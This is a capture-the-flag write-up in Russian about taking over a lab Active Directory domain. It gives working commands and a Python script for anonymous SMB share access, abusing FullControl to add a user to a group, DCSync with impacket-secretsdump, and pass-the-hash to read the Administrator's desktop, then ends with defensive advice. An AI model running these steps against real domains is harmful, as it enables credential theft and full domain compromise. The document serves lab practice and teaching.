# Legacy IT: анонимная SMB-шара, ACL группы и DCSync

[English](solve.md)

## 1. Откуда взялись первые учётные данные

Цель — файл на рабочем столе Administrator в домене `easyad.local`. Анонимно доступная SMB-шара `Public` содержала `onboarding.txt` с данными пользователя `trainee`:

```bash
smbclient -N //<DC>/Public -c 'get onboarding.txt'
# Anonymous login successful
# New IT trainee account; Domain: easyad.local; Username: trainee
```

В публичной версии пароль и адрес инстанса скрыты. Это раскрытие учётных данных через общую шару, а не подбор пароля.

## 2. Права на Legacy IT Admins

Разведка AD показала, что у `trainee` есть `FullControl` на группу `Legacy IT Admins`. Необычная деталь: пользователь входит под логином `trainee`, но его DN — `CN=Jamie Smith,CN=Users,DC=easyad,DC=local`.

Успешный вариант изменения членства:

```python
from ldap3 import Connection, Server, Tls, MODIFY_ADD

srv = Server("ldaps://<DC>", tls=Tls(validate=0))
conn = Connection(srv, user="trainee@easyad.local",
                  password="<ONBOARDING_PASSWORD>", auto_bind=True)
group = "CN=Legacy IT Admins,CN=Users,DC=easyad,DC=local"
user = "CN=Jamie Smith,CN=Users,DC=easyad,DC=local"
assert conn.modify(group, {"member": [(MODIFY_ADD, [user])]})
print(conn.result["description"])  # success
```

Журнал показывает `mod: True success`, после чего LDAP перечислил `Jamie Smith` среди участников группы. До этого были неудачные варианты с `-ldaps` в Impacket и с неверным форматом имени при LDAP-bind.

## 3. DCSync и NT-хэш Administrator

Группа дала эффективные права репликации каталога. Повторная аутентификация под `trainee` позволила вызвать:

```bash
impacket-secretsdump -just-dc-user Administrator \
  'easyad.local/trainee:<ONBOARDING_PASSWORD>@<DC>' -dc-ip <DC>
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:<LM_HASH>:<NT_HASH>:::
```

Это **DCSync через DRSUAPI**, не извлечение локальной SAM. Полученный NT-хэш доменного Administrator использовали для pass-the-hash по SMB.

## 4. Чтение флага

```text
impacket-smbclient -hashes :<ADMIN_NT_HASH> 'easyad.local/Administrator@<DC>'
use C$
ls Users\Administrator\Desktop
cat Users\Administrator\Desktop\flag.txt
```

В ответ получен флаг:

```text
PP{l3g4cy-1t-4dm1ns…9Sp7u}
```

**Платформа приняла флаг.** Цепочка: анонимная шара `Public/onboarding.txt` → `trainee` → `FullControl` на `Legacy IT Admins` → добавление себя в группу → DCSync → NT-хэш Administrator → чтение рабочего стола по SMB.

## 5. Что защищать

Не хранить рабочие пароли на гостевых шарах; проверять `FullControl` на группах, ограничивать права репликации домена и отслеживать одновременно изменение членства и активность DRSUAPI. Устаревшие протоколы здесь не являлись обязательным звеном эксплуатации.

Сводка очищенных фрагментов исходного журнала — [evidence/session-checkpoints.md](evidence/session-checkpoints.md).

Команды: [`scripts/dcsync-and-smb.sh`](scripts/dcsync-and-smb.sh) — DCSync под `trainee` и вход по NT-хэшу в `C$`.
